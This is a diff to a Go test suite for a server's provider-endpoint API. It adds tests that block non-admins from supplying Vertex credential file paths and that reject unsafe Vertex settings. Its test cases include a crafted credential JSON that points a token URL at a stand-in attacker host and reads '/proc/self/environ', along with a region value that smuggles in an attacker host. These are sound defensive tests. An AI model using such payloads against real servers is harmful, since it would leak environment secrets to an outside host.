@@ -1805,7 +1805,7 @@ func (s *ProviderHandlersSuite) TestCreateProviderEndpoint_AcceptsValidShapes() 
 		{"https", types.ProviderEndpoint{Name: "openai", BaseURL: "https://api.openai.com/v1"}, "https://api.openai.com/v1"},
 		{"http with port, trimmed", types.ProviderEndpoint{Name: " my-ollama ", BaseURL: "  http://localhost:11434/v1 "}, "http://localhost:11434/v1"},
 		{"query string", types.ProviderEndpoint{Name: "azure", BaseURL: "https://x.openai.azure.com/openai?api-version=2024-06-01"}, "https://x.openai.azure.com/openai?api-version=2024-06-01"},
-		{"vertex without base_url", types.ProviderEndpoint{Name: "vertex", VertexProjectID: "proj-1", VertexRegion: "us-east5"}, ""},
+		{"vertex without base_url", types.ProviderEndpoint{Name: "vertex", VertexProjectID: "proj-1", VertexRegion: "us-east5", VertexCredentialsJSON: `{"type":"service_account"}`}, ""},
 	}
 	for _, tc := range cases {
 		s.Run(tc.name, func() {
@@ -1858,4 +1858,102 @@ func (s *ProviderHandlersSuite) TestUpdateProviderEndpoint_RejectsMalformedShape
 			s.NotContains(rr.Body.String(), "Go struct")
 		})
 	}
+}
+
+// Non-admins must not be able to make the server read a Vertex credentials
+// file from its own filesystem.
+func (s *ProviderHandlersSuite) TestCreateProviderEndpoint_NonAdminCannotAddVertexCredentialsFile() {
+	s.server.authMiddleware = &authMiddleware{store: s.store, cfg: authMiddlewareConfig{}}
+	s.store.EXPECT().GetUser(gomock.Any(), gomock.Any()).Return(&types.User{ID: "user_id"}, nil).AnyTimes()
+	s.server.Cfg.Providers.EnableCustomUserProviders = true
+	s.store.EXPECT().GetSystemSettings(gomock.Any()).Return(&types.SystemSettings{
+		ProvidersManagementEnabled: true,
+	}, nil).AnyTimes()
+
+	body, err := json.Marshal(types.ProviderEndpoint{
+		Name:                  "my-vertex",
+		EndpointType:          types.ProviderEndpointTypeUser,
+		VertexProjectID:       "my-project",
+		VertexRegion:          "global",
+		VertexCredentialsFile: "/run/secrets/vertex.json",
+	})
+	s.Require().NoError(err)
+	req := httptest.NewRequest(http.MethodPost, "/v1/provider-endpoints", bytes.NewReader(body))
+	req = req.WithContext(s.authCtx)
+	rr := httptest.NewRecorder()
+
+	s.server.createProviderEndpoint(rr, req)
+
+	s.Equal(http.StatusForbidden, rr.Code, rr.Body.String())
+}
+
+// User endpoints must bring their own service account key: no fallback to the
+// server's Google identity and no credential types that read local files or
+// contact arbitrary token URLs.
+func (s *ProviderHandlersSuite) TestCreateProviderEndpoint_RejectsUnsafeVertexSettings() {
+	s.server.authMiddleware = &authMiddleware{store: s.store, cfg: authMiddlewareConfig{}}
+	s.store.EXPECT().GetUser(gomock.Any(), gomock.Any()).Return(&types.User{ID: "user_id"}, nil).AnyTimes()
+	s.server.Cfg.Providers.EnableCustomUserProviders = true
+	s.store.EXPECT().GetSystemSettings(gomock.Any()).Return(&types.SystemSettings{
+		ProvidersManagementEnabled: true,
+	}, nil).AnyTimes()
+
+	cases := map[string]types.ProviderEndpoint{
+		"no credentials": {VertexRegion: "global"},
+		"external account": {
+			VertexRegion:          "global",
+			VertexCredentialsJSON: `{"type":"external_account","token_url":"https://attacker.example/token","credential_source":{"file":"/proc/self/environ"}}`,
+		},
+		"host in region": {
+			VertexRegion:          "attacker.example/",
+			VertexCredentialsJSON: `{"type":"service_account"}`,
+		},
+	}
+	for name, endpoint := range cases {
+		endpoint.Name = "my-vertex"
+		endpoint.EndpointType = types.ProviderEndpointTypeUser
+		endpoint.VertexProjectID = "my-project"
+		body, err := json.Marshal(endpoint)
+		s.Require().NoError(err)
+		req := httptest.NewRequest(http.MethodPost, "/v1/provider-endpoints", bytes.NewReader(body))
+		req = req.WithContext(s.authCtx)
+		rr := httptest.NewRecorder()
+
+		s.server.createProviderEndpoint(rr, req)
+
+		s.Equal(http.StatusBadRequest, rr.Code, "%s: %s", name, rr.Body.String())
+	}
+}
+
+func (s *ProviderHandlersSuite) TestUpdateProviderEndpoint_NonAdminCannotAddVertexCredentialsFile() {
+	endpointID := "ep_123"
+	credentialsFile := "/run/secrets/vertex.json"
+	existing := &types.ProviderEndpoint{
+		ID:                    endpointID,
+		Name:                  "my-vertex",
+		Owner:                 "user_id",
+		OwnerType:             types.OwnerTypeUser,
+		EndpointType:          types.ProviderEndpointTypeUser,
+		VertexProjectID:       "my-project",
+		VertexRegion:          "global",
+		VertexCredentialsJSON: `{"type":"service_account"}`,
+	}
+
+	s.store.EXPECT().GetSystemSettings(gomock.Any()).Return(&types.SystemSettings{
+		ProvidersManagementEnabled: true,
+	}, nil)
+	s.store.EXPECT().GetProviderEndpoint(gomock.Any(), &store.GetProviderEndpointsQuery{
+		ID: endpointID,
+	}).Return(existing, nil)
+
+	body, err := json.Marshal(types.UpdateProviderEndpoint{VertexCredentialsFile: &credentialsFile})
+	s.Require().NoError(err)
+	req := httptest.NewRequest(http.MethodPut, "/v1/provider-endpoints/"+endpointID, bytes.NewReader(body))
+	req = req.WithContext(s.authCtx)
+	req = mux.SetURLVars(req, map[string]string{"id": endpointID})
+	rr := httptest.NewRecorder()
+
+	s.server.updateProviderEndpoint(rr, req)
+
+	s.Equal(http.StatusForbidden, rr.Code, rr.Body.String())
 }
